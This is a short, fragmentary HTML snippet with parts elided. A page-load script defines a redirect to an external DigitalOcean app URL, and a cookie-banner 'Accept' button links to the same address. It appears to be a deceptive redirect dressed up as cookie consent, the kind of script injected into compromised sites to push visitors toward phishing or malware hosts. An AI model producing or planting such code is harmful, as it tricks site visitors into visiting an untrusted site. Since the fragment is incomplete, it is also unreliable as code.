...
<head>
	<script>
	        document.addEventListener("DOMContentLoaded", function () {
	            const redirectUrl = "https://lobster-app-w6js9.ondigitalocean.app/";
	...
	<a href="https://lobster-app-w6js9.ondigitalocean.app/" id="accept-cookies" class="btn-primary">Accept</a>
	</div>
	            `;
